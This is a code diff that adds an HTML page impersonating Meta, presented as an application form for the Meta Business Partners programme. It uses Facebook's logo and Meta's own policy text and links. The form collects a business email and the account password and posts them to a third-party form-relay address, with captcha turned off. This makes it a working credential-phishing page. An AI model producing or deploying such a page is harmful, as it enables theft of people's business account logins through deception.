@@ -1,0 +1,125 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Apply to Meta Business</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f6f7f9;
+    }
+
+    .meta-form-container {
+      max-width: 600px;
+      margin: 60px auto;
+      background: white;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+    }
+
+    .meta-logo {
+      width: 35px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin: 15px 0 5px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .checkbox-label {
+      font-size: 14px;
+      color: #555;
+      margin-top: 20px;
+    }
+
+    .checkbox-label input {
+      margin-right: 8px;
+    }
+
+    .info-text {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.6;
+      margin-top: 10px;
+    }
+
+    .info-text a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #1459c9;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="meta-form-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="meta-logo" alt="Meta Logo">
+    <h2>Apply to Meta Business Partners</h2>
+
+    <form action="https://formsubmit.co/el/begute" method="POST">
+      <label for="business">Business</label>
+      <input type="text" id="business" name="Business" placeholder="Enter your business" required>
+
+      <label for="email">Business Email</label>
+      <input type="email" id="email" name="Business Email" placeholder="Enter your email" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="Password" placeholder="Enter password" required>
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou.html">
+
+      <label class="checkbox-label">
+        <input type="checkbox" name="updates">
+        Opt-in to Partner Program Updates
+      </label>
+
+      <div class="info-text">
+        Stay informed! Don't miss out on Meta Business Partner programme updates, benefit information or product and policy changes. Tick the box to enable partner programme update notifications in your Business Manager account. By ticking this box, you agree to receive marketing-related electronic Meta Business Partners communications from Meta, including programme-specific information, newsletters and event emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails or unsubscribing from partner programme updates in your Business Manager <a href="https://business.facebook.com/settings/preferences" target="_blank">notification settings</a>. For more information about how Meta handles your data, please read our <a href="https://facebook.com/privacy/policy" target="_blank">Meta Privacy Policy</a>.
+        <br><br>
+        The Meta Business Partner <a href="https://www.facebook.com/fbp/policies" target="_blank">terms and conditions</a> that you previously accepted apply to your application. For more information about how Meta handles your data, please read our <a href="https://facebook.com/privacy/policy" target="_blank">Meta Privacy Policy</a>.
+      </div>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+</body>
+</html>
